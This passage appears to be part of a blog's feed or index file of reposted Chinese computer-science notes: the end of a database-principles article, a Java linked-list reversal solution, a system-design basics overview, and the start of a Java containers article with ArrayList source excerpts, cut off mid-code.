href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/de9b9ea0-1327-4865-93e5-6f805c48bc9e.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/de9b9ea0-1327-4865-93e5-6f805c48bc9e.png" alt="img"></a></p><h2 id="表示子类"><a href="#表示子类" class="headerlink" title="表示子类"></a>表示子类</h2><p>用一个三角形和两条线来连接类和子类，与子类有关的属性和联系都连到子类上，而与父类和子类都有关的连到父类上。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/7ec9d619-fa60-4a2b-95aa-bf1a62aad408.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/7ec9d619-fa60-4a2b-95aa-bf1a62aad408.jpg" alt="img"></a></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>AbrahamSilberschatz, HenryF.Korth, S.Sudarshan, 等. 数据库系统概念 [M]. 机械工业出版社, 2006.</li><li>施瓦茨. 高性能 MYSQL(第3版)[M]. 电子工业出版社, 2013.</li><li>史嘉权. 数据库系统概论[M]. 清华大学出版社有限公司, 2006.</li><li><a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-storage-engine.html" target="_blank" rel="noopener">The InnoDB Storage Engine</a></li><li><a href="https://www.slideshare.net/ErnestoHernandezRodriguez/transaction-isolation-levels" target="_blank" rel="noopener">Transaction isolation levels</a></li><li><a href="http://scanftree.com/dbms/2-phase-locking-protocol" target="_blank" rel="noopener">Concurrency Control</a></li><li><a href="https://www.slideshare.net/brshristov/the-nightmare-of-locking-blocking-and-isolation-levels-46391666" target="_blank" rel="noopener">The Nightmare of Locking, Blocking and Isolation Levels!</a></li><li><a href="https://aksakalli.github.io/2012/03/12/database-normalization-and-normal-forms-with-an-example.html" target="_blank" rel="noopener">Database Normalization and Normal Forms with an Example</a></li><li><a href="https://blog.jcole.us/2014/04/16/the-basics-of-the-innodb-undo-logging-and-history-system/" target="_blank" rel="noopener">The basics of the InnoDB undo logging and history system</a></li><li><a href="https://www.brightbox.com/blog/2013/10/31/on-mysql-locks/" target="_blank" rel="noopener">MySQL locking for the busy web developer</a></li><li><a href="https://draveness.me/mysql-innodb" target="_blank" rel="noopener">浅入浅出 MySQL 和 InnoDB</a></li><li><a href="https://tech.meituan.com/innodb-lock.html" target="_blank" rel="noopener">Innodb 中的事务隔离级别和锁的关系</a></li></ul><p>本文转载自:<a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md">https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86.md</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库系统原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反转单链表</title>
      <link href="/2018/12/24/suan-fa/lian-biao/fan-zhuan-dan-lian-biao/"/>
      <url>/2018/12/24/suan-fa/lian-biao/fan-zhuan-dan-lian-biao/</url>
      
        <content type="html"><![CDATA[<h2 id="反转单链表"><a href="#反转单链表" class="headerlink" title="反转单链表"></a>反转单链表</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个单链表，你需要反转它，然后返回。</p><pre class=" language-markdown"><code class="language-markdown">比如说给你的单链表是：1 -> 2 -> 3 -> 4 -> 5 -> null你要返回的反转后的链表是：5 -> 4 -> 3 -> 2 -> 1 -> null</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ListNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    ListNode next<span class="token punctuation">;</span>    <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> ListNode <span class="token function">reverseList</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ListNode cur <span class="token operator">=</span> head<span class="token punctuation">,</span> pre <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>cur <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>      ListNode next <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      cur<span class="token punctuation">.</span>next <span class="token operator">=</span> pre<span class="token punctuation">;</span>      pre <span class="token operator">=</span> cur<span class="token punctuation">;</span>      cur <span class="token operator">=</span> next<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> pre<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系统设计基础</title>
      <link href="/2018/12/24/xi-tong-she-ji/xi-tong-she-ji-ji-chu/"/>
      <url>/2018/12/24/xi-tong-she-ji/xi-tong-she-ji-ji-chu/</url>
      
        <content type="html"><![CDATA[<h2 id="系统设计基础"><a href="#系统设计基础" class="headerlink" title="系统设计基础"></a>系统设计基础</h2><ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#%E4%B8%80%E6%80%A7%E8%83%BD">一、性能</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#%E4%BA%8C%E4%BC%B8%E7%BC%A9%E6%80%A7">二、伸缩性</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#%E4%B8%89%E6%89%A9%E5%B1%95%E6%80%A7">三、扩展性</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#%E5%9B%9B%E5%8F%AF%E7%94%A8%E6%80%A7">四、可用性</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#%E4%BA%94%E5%AE%89%E5%85%A8%E6%80%A7">五、安全性</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li></ul><h1 id="一、性能"><a href="#一、性能" class="headerlink" title="一、性能"></a>一、性能</h1><h2 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h2><h3 id="1-响应时间"><a href="#1-响应时间" class="headerlink" title="1. 响应时间"></a>1. 响应时间</h3><p>指某个请求从发出到接收到响应消耗的时间。</p><p>在对响应时间进行测试时，通常采用重复请求方式，然后计算平均响应时间。</p><h3 id="2-吞吐量"><a href="#2-吞吐量" class="headerlink" title="2. 吞吐量"></a>2. 吞吐量</h3><p>指系统在单位时间内可以处理的请求数量，通常使用每秒的请求数来衡量。</p><h3 id="3-并发用户数"><a href="#3-并发用户数" class="headerlink" title="3. 并发用户数"></a>3. 并发用户数</h3><p>指系统能同时处理的并发用户请求数量。</p><p>在没有并发存在的系统中，请求被顺序执行，此时响应时间为吞吐量的倒数。例如系统支持的吞吐量为 100 req/s，那么平均响应时间应该为 0.01s。</p><p>目前的大型系统都支持多线程来处理并发请求，多线程能够提高吞吐量以及缩短响应时间，主要有两个原因：</p><ul><li>多 CPU</li><li>IO 等待时间</li></ul><p>使用 IO 多路复用等方式，系统在等待一个 IO 操作完成的这段时间内不需要被阻塞，可以去处理其它请求。通过将这个等待时间利用起来，使得 CPU 利用率大大提高。</p><p>并发用户数不是越高越好，因为如果并发用户数太高，系统来不及处理这么多的请求，会使得过多的请求需要等待，那么响应时间就会大大提高。</p><h2 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h2><h3 id="1-集群"><a href="#1-集群" class="headerlink" title="1. 集群"></a>1. 集群</h3><p>将多台服务器组成集群，使用负载均衡将请求转发到集群中，避免单一服务器的负载压力过大导致性能降低。</p><h3 id="2-缓存"><a href="#2-缓存" class="headerlink" title="2. 缓存"></a>2. 缓存</h3><p>缓存能够提高性能的原因如下：</p><ul><li>缓存数据通常位于内存等介质中，这种介质对于读操作特别快；</li><li>缓存数据可以位于靠近用户的地理位置上；</li><li>可以将计算结果进行缓存，从而避免重复计算。</li></ul><h3 id="3-异步"><a href="#3-异步" class="headerlink" title="3. 异步"></a>3. 异步</h3><p>某些流程可以将操作转换为消息，将消息发送到消息队列之后立即返回，之后这个操作会被异步处理。</p><h1 id="二、伸缩性"><a href="#二、伸缩性" class="headerlink" title="二、伸缩性"></a>二、伸缩性</h1><p>指不断向集群中添加服务器来缓解不断上升的用户并发访问压力和不断增长的数据存储需求。</p><h2 id="伸缩性与性能"><a href="#伸缩性与性能" class="headerlink" title="伸缩性与性能"></a>伸缩性与性能</h2><p>如果系统存在性能问题，那么单个用户的请求总是很慢的；</p><p>如果系统存在伸缩性问题，那么单个用户的请求可能会很快，但是在并发数很高的情况下系统会很慢。</p><h2 id="实现伸缩性"><a href="#实现伸缩性" class="headerlink" title="实现伸缩性"></a>实现伸缩性</h2><p>应用服务器只要不具有状态，那么就可以很容易地通过负载均衡器向集群中添加新的服务器。</p><p>关系型数据库的伸缩性通过 Sharding 来实现，将数据按一定的规则分布到不同的节点上，从而解决单台存储服务器的存储空间限制。</p><p>对于非关系型数据库，它们天生就是为海量数据而诞生，对伸缩性的支持特别好。</p><h1 id="三、扩展性"><a href="#三、扩展性" class="headerlink" title="三、扩展性"></a>三、扩展性</h1><p>指的是添加新功能时对现有系统的其它应用无影响，这就要求不同应用具备低耦合的特点。</p><p>实现可扩展主要有两种方式：</p><ul><li>使用消息队列进行解耦，应用之间通过消息传递进行通信；</li><li>使用分布式服务将业务和可复用的服务分离开来，业务使用分布式服务框架调用可复用的服务。新增的产品可以通过调用可复用的服务来实现业务逻辑，对其它产品没有影响。</li></ul><h1 id="四、可用性"><a href="#四、可用性" class="headerlink" title="四、可用性"></a>四、可用性</h1><h2 id="冗余"><a href="#冗余" class="headerlink" title="冗余"></a>冗余</h2><p>保证高可用的主要手段是使用冗余，当某个服务器故障时就请求其它服务器。</p><p>应用服务器的冗余比较容易实现，只要保证应用服务器不具有状态，那么某个应用服务器故障时，负载均衡器将该应用服务器原先的用户请求转发到另一个应用服务器上，不会对用户有任何影响。</p><p>存储服务器的冗余需要使用主从复制来实现，当主服务器故障时，需要提升从服务器为主服务器，这个过程称为切换。</p><h2 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h2><p>对 CPU、内存、磁盘、网络等系统负载信息进行监控，当某个数据达到一定阈值时通知运维人员，从而在系统发生故障之前及时发现问题。</p><h2 id="服务降级"><a href="#服务降级" class="headerlink" title="服务降级"></a>服务降级</h2><p>服务降级是系统为了应对大量的请求，主动关闭部分功能，从而保证核心功能可用。</p><h1 id="五、安全性"><a href="#五、安全性" class="headerlink" title="五、安全性"></a>五、安全性</h1><p>要求系统在应对各种攻击手段时能够有可靠的应对措施。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>大型网站技术架构：核心原理与案例分析</li></ul><p>本文转载自: <a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md">https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80.md</a></p>]]></content>
      
      
      <categories>
          
          <category> 系统设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统设计基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java容器</title>
      <link href="/2018/12/24/java/java-rong-qi/java-rong-qi/"/>
      <url>/2018/12/24/java/java-rong-qi/java-rong-qi/</url>
      
        <content type="html"><![CDATA[<h2 id="Java容器"><a href="#Java容器" class="headerlink" title="Java容器"></a>Java容器</h2><ul><li>一、概览<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%AE%B9%E5%99%A8.md#collection">Collection</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%AE%B9%E5%99%A8.md#map">Map</a></li></ul></li><li>二、容器中的设计模式<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%AE%B9%E5%99%A8.md#%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%A8%A1%E5%BC%8F">迭代器模式</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%AE%B9%E5%99%A8.md#%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F">适配器模式</a></li></ul></li><li>三、源码分析<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%AE%B9%E5%99%A8.md#arraylist">ArrayList</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%AE%B9%E5%99%A8.md#vector">Vector</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%AE%B9%E5%99%A8.md#copyonwritearraylist">CopyOnWriteArrayList</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%AE%B9%E5%99%A8.md#linkedlist">LinkedList</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%AE%B9%E5%99%A8.md#hashmap">HashMap</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%AE%B9%E5%99%A8.md#concurrenthashmap">ConcurrentHashMap</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%AE%B9%E5%99%A8.md#linkedhashmap">LinkedHashMap</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%AE%B9%E5%99%A8.md#weakhashmap">WeakHashMap</a></li></ul></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%AE%B9%E5%99%A8.md#%E9%99%84%E5%BD%95">附录</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%AE%B9%E5%99%A8.md#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li></ul><h1 id="一、概览"><a href="#一、概览" class="headerlink" title="一、概览"></a>一、概览</h1><p>容器主要包括 Collection 和 Map 两种，Collection 存储着对象的集合，而 Map 存储着键值对（两个对象）的映射表。</p><h2 id="Collection"><a href="#Collection" class="headerlink" title="Collection"></a>Collection</h2><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/VP6n3i8W48Ptde8NQ9_0eSR5eOD6uqx.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/VP6n3i8W48Ptde8NQ9_0eSR5eOD6uqx.png" alt="img"></a></p><h3 id="1-Set"><a href="#1-Set" class="headerlink" title="1. Set"></a>1. Set</h3><ul><li>TreeSet：基于红黑树实现，支持有序性操作，例如根据一个范围查找元素的操作。但是查找效率不如 HashSet，HashSet 查找的时间复杂度为 O(1)，TreeSet 则为 O(logN)。</li><li>HashSet：基于哈希表实现，支持快速查找，但不支持有序性操作。并且失去了元素的插入顺序信息，也就是说使用 Iterator 遍历 HashSet 得到的结果是不确定的。</li><li>LinkedHashSet：具有 HashSet 的查找效率，且内部使用双向链表维护元素的插入顺序。</li></ul><h3 id="2-List"><a href="#2-List" class="headerlink" title="2. List"></a>2. List</h3><ul><li>ArrayList：基于动态数组实现，支持随机访问。</li><li>Vector：和 ArrayList 类似，但它是线程安全的。</li><li>LinkedList：基于双向链表实现，只能顺序访问，但是可以快速地在链表中间插入和删除元素。不仅如此，LinkedList 还可以用作栈、队列和双向队列。</li></ul><h3 id="3-Queue"><a href="#3-Queue" class="headerlink" title="3. Queue"></a>3. Queue</h3><ul><li>LinkedList：可以用它来实现双向队列。</li><li>PriorityQueue：基于堆结构实现，可以用它来实现优先队列。</li></ul><h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/SoWkIImgAStDuUBAp2j9BKfBJ4vLy4q.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/SoWkIImgAStDuUBAp2j9BKfBJ4vLy4q.png" alt="img"></a></p><ul><li>TreeMap：基于红黑树实现。</li><li>HashMap：基于哈希表实现。</li><li>HashTable：和 HashMap 类似，但它是线程安全的，这意味着同一时刻多个线程可以同时写入 HashTable 并且不会导致数据不一致。它是遗留类，不应该去使用它。现在可以使用 ConcurrentHashMap 来支持线程安全，并且 ConcurrentHashMap 的效率会更高，因为 ConcurrentHashMap 引入了分段锁。</li><li>LinkedHashMap：使用双向链表来维护元素的顺序，顺序为插入顺序或者最近最少使用（LRU）顺序。</li></ul><h1 id="二、容器中的设计模式"><a href="#二、容器中的设计模式" class="headerlink" title="二、容器中的设计模式"></a>二、容器中的设计模式</h1><h2 id="迭代器模式"><a href="#迭代器模式" class="headerlink" title="迭代器模式"></a>迭代器模式</h2><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/SoWkIImgAStDuUBAp2j9BKfBJ4vLy0G.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/SoWkIImgAStDuUBAp2j9BKfBJ4vLy0G.png" alt="img"></a></p><p>Collection 继承了 Iterable 接口，其中的 iterator() 方法能够产生一个 Iterator 对象，通过这个对象就可以迭代遍历 Collection 中的元素。</p><p>从 JDK 1.5 之后可以使用 foreach 方法来遍历实现了 Iterable 接口的聚合对象。</p><pre class=" language-java"><code class="language-java">List<span class="token operator">&lt;</span>String<span class="token operator">></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>String item <span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h2><p>java.util.Arrays#asList() 可以把数组类型转换为 List 类型。</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@SafeVarargs</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> List<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token function">asList</span><span class="token punctuation">(</span>T<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> a<span class="token punctuation">)</span></code></pre><p>应该注意的是 asList() 的参数为泛型的变长参数，不能使用基本类型数组作为参数，只能使用相应的包装类型数组。</p><pre class=" language-java"><code class="language-java">Integer<span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span>List list <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>也可以使用以下方式调用 asList()：</p><pre class=" language-java"><code class="language-java">List list <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id="三、源码分析"><a href="#三、源码分析" class="headerlink" title="三、源码分析"></a>三、源码分析</h1><p>如果没有特别说明，以下源码分析基于 JDK 1.8。</p><p>在 IDEA 中 double shift 调出 Search EveryWhere，查找源码文件，找到之后就可以阅读源码。</p><h2 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h2><h3 id="1-概览"><a href="#1-概览" class="headerlink" title="1. 概览"></a>1. 概览</h3><p>实现了 RandomAccess 接口，因此支持随机访问。这是理所当然的，因为 ArrayList 是基于数组实现的。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span>E<span class="token operator">></span> <span class="token keyword">extends</span> <span class="token class-name">AbstractList</span><span class="token operator">&lt;</span>E<span class="token operator">></span>        <span class="token keyword">implements</span> <span class="token class-name">List</span><span class="token operator">&lt;</span>E<span class="token operator">></span><span class="token punctuation">,</span> RandomAccess<span class="token punctuation">,</span> Cloneable<span class="token punctuation">,</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable</code></pre><p>数组的默认大小为 10。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> DEFAULT_CAPACITY <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span></code></pre><h3 id="2-扩容"><a href="#2-扩容" class="headerlink" title="2. 扩容"></a>2. 扩容</h3><p>添加元素时使用 ensureCapacityInternal() 方法来保证容量足够，如果不够时，需要使用 grow() 方法进行扩容，新容量的大小为 <code>oldCapacity + (oldCapacity &gt;&gt; 1)</code>，也就是旧容量的 1.5 倍。</p><p>扩容操作需要调用 <code>Arrays.copyOf()</code> 把原数组整个复制到新数组中，这个操作代价很高，因此最好在创建 ArrayList 对象时就指定大概的容量大小，减少扩容操作的次数。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">add</span><span class="token punctuation">(</span>E e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">ensureCapacityInternal</span><span class="token punctuation">(</span>size <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// Increments modCount!!</span>    elementData<span class="token punctuation">[</span>size<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">ensureCapacityInternal</span><span class="token punctuation">(</span><span class="token keyword">int</span> minCapacity<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>elementData <span class="token operator">==</span> DEFAULTCAPACITY_EMPTY_ELEMENTDATA<span class="token punctuation">)</span> <span class="token punctuation">{</span>        minCapacity <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>DEFAULT_CAPACITY<span class="token punctuation">,</span> minCapacity<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">ensureExplicitCapacity</span><span class="token punctuation">(</span>minCapacity<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">ensureExplicitCapacity</span><span class="token punctuation">(</span><span class="token keyword">int</span> minCapacity<span class="token punctuation">)</span> <span class="token punctuation">{</span>    modCount<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// overflow-conscious code</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>minCapacity <span class="token operator">-</span> elementData<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">grow</span><span class="token punctuation">(</span>minCapacity<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">grow</span><span class="token punctuation">(</span><span class="token keyword">int</span> minCapacity<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// overflow-conscious code</span>    <span class="token keyword">int</span> oldCapacity <span class="token operator">=</span> elementData<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span> newCapacity <span class="token operator">=</span> oldCapacity <span class="token operator">+</span> <span class="token punctuation">(</span>oldCapacity <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>newCapacity <span class="token operator">-</span> minCapacity <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        newCapacity <span class="token operator">=</span> minCapacity<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>newCapacity <span class="token operator">-</span> MAX_ARRAY_SIZE <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        newCapacity <span class="token operator">=</span> <span class="token function">hugeCapacity</span><span class="token punctuation">(</span>minCapacity<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// minCapacity is usually close to size, so this is a win:</span>    elementData <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>elementData<span class="token punctuation">,</span> newCapacity<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="3-删除元素"><a href="#3-删除元素" class="headerlink" title="3. 删除元素"></a>3. 删除元素</h3><p>需要调用 System.arraycopy() 将 index+1 后面的元素都复制到 index 位置上，该操作的时间复杂度为 O(N)，可以看出 ArrayList 删除元素的代价是非常高的。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> E <span class="token function">remove</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">rangeCheck</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>    modCount<span class="token operator">++</span><span class="token punctuation">;</span>    E oldValue <span class="token operator">=</span> <span class="token function">elementData</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> numMoved <span class="token operator">=</span> size <span class="token operator">-</span> index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>numMoved <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        System<span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span>elementData<span class="token punctuation">,</span> index<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> elementData<span class="token punctuation">,</span> index<span class="token punctuation">,</span> numMoved<span class="token punctuation">)</span><span class="token punctuation">;</span>    elementData<span class="token punctuation">[</span><span class="token operator">--</span>size<span class="token punctuation">]</span> <span class="token operator">=</span> null<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// clear to let GC do its work</span>    <span class="token keyword">return</span> oldValue<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="4-Fail-Fast"><a href="#4-Fail-Fast" class="headerlink" title="4. Fail-Fast"></a>4. Fail-Fast</h3><p>modCount 用来记录 ArrayList 结构发生变化的次数。结构发生变化是指添加或者删除至少一个元素的所有操作，或者是调整内部数组的大小，仅仅只是设置元素的值不算结构发生变化。</p><p>在进行序列化或者迭代等操作时，需要比较操作前后 modCount 是否改变，如果改变了需要抛出 ConcurrentModificationException。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">writeObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream s<span class="token punctuation">)</span>    <span class="token keyword">throws</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Write out element count, and any hidden stuff</span>    <span class="token keyword">int</span> expectedModCount <span class="token operator">=</span> modCount<span class="token punctuation">;</span>    s<span class="token punctuation">.</span><span class="token function">defaultWriteObject</span><span class="token 